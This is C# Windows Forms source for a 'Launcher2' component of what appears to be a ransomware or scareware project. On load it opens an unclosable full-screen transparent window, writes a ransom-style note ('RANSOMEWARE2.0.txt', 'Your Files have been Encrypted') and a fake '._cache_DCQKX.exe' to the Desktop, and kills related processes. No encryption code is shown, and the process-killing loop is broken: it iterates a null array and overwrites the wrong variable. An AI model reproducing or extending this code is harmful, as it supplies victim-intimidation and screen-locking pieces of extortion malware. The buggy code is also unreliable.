using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace de4d1nsid3
{
    public partial class Launcher2 : Form
    {
        public Launcher2()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {

            e.Cancel = true;

        }

        private void launcher2_Load(object sender, EventArgs e)
        {
            this.Left = 0;
            this.Top = 0;
            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Height;

            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string existfile = path_cache + @"\._cache_DCQKX.exe";
            if (!File.Exists(existfile))
            {
                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQKX.exe"))
                {
                    streamWriter.WriteLine("Your Files have been Encrypted");
                }
            }

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMEWARE2.0.txt"))
            {
                streamWriter.WriteLine("Your Files have been Encrypted");
            }

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            Process[] _process = null;
            _process = Process.GetProcessesByName("DCQKX");
            foreach (Process proces in _process)
            {
                proces.Kill();
            }

            Process[] _process2 = null;
            _process = Process.GetProcessesByName("._cache_DCQKX");
            foreach (Process proces2 in _process2)
            {
                proces2.Kill();
            } //7minutes on youtube //https://www.youtube.com/watch?v=UfHgALGjtJs&t=131s // 

        }
    }
}
